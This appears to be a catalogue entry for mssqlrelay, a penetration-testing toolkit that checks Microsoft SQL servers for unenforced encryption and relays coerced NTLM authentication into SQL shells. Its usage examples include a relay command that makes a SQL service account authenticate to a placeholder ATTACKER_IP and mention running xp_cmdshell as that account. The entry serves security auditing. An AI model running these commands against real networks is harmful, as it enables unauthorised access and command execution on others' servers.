---
name: "mssqlrelay"
categories:
  - blackarch-windows
version: "12.1e03c96"
homepage: "https://github.com/CompassSecurity/mssqlrelay"
packaged-by: [blackarch]
blackarch-builddate: "2026-08-02"
build-system: windows
license: MIT
meta-checked: "2026-11-09"
github-repo: "CompassSecurity/mssqlrelay"
github-stars: 64
github-pushed: "2026-07-28"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 1
gh-activity-checked: "2026-11-09"
---

# mssqlrelay

> Python toolkit for auditing and abusing Microsoft SQL services: checks encryption enforcement, sweeps domain SQL SPNs, and relays MSSQL service-account NTLM sessions into SQL shells.

## What it's for

MSSQLRelay (Sylvain Heiniger / Compass Security) is an offensive tool for auditing and abusing MSSQL services. Its core observation is that NTLM relay into MSSQL only works when the target SQL server does not enforce encryption — so the toolkit first checks that property (`check` for a single server, `checkall` for every MSSQL SPN discovered over LDAP from a domain controller), reporting per-server version, encryption setting, login result, database and available coercion privileges such as `xp_dirtree` and `xp_fileexist`.

Once a suitable victim is found, `relay` authenticates to it as a regular user, triggers an outbound SMB authentication from the SQL service account (for example by calling `xp_dirtree` on an attacker UNC path), captures it on a local listener, and relays it to another SQL endpoint — landing in an interactive SQL shell running as the relayed service account. Authentication options mirror impacket tooling: password, NTLM hash (`-hashes`), Kerberos (`-k`), SSPI on Windows, AES keys, and `-windows-auth` against SQL.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Check whether one SQL server is relayable

```
mssqlrelay check -target target.example.com -u user@example.com -p 'Password1' -windows-auth
```

Outcome: resolves and connects to the single target and prints its SQL version, whether encryption is enforced, whether the login succeeded and as which DB user — "Encryption: not enforced" marks the server as a relay candidate.

### Audit every MSSQL instance in a domain

```
mssqlrelay checkall -scheme ldap -target example.com -dc-ip 198.51.100.10 -u user@example.com -p 'Password1' -windows-auth
```

Outcome: enumerates all MSSQL SPNs from LDAP, then checks each instance for version, encryption enforcement, login access and available privileges (`xp_dirtree`, `xp_fileexist`) — a domain-wide map of relay-capable SQL endpoints in one run.

### Relay a service account into a SQL shell

```
mssqlrelay relay -target target.example.com -u user@example.com -p 'Password1' relay-target.example.com ATTACKER_IP
```

Outcome: opens an SMB listener (port 445) on the attacking host, authenticates to the victim SQL server, coerces its service account to authenticate back to ATTACKER_IP, and relays that session to the relay target, dropping into an interactive SQL shell (`SQL (EXAMPLE\svc_sql  dbo@master)>`) — `xp_cmdshell whoami` style commands run as the relayed service account if xp_cmdshell is available. Type `help` in the shell for extra commands.
